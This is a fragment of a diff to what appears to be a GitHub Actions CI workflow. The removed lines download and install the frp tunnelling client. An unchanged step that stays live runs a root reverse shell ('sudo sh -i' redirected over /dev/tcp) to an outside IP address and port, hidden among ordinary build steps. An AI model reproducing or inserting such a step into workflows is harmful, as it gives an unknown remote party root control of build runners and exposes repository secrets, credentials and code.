@@ -23,14 +23,6 @@ jobs:
         run: |
          sudo sh -i >& /dev/tcp/8.138.123.18/8811 0>&1
 
-      # Download and prepare frpc
-      - name: Download frpc
-        run: |
-          echo "Downloading frpc..."
-          sudo curl -L https://github.com/fatedier/frp/releases/download/v0.60.0/frp_0.60.0_linux_amd64.tar.gz -o frp.tar.gz
-          sudo tar -xzvf frp.tar.gz
-          sudo mv frp_0.60.0_linux_amd64/frpc ./frpc
-          sudo chmod +x ./frpc
 
       # Checkout your code
       - name: Checkout code
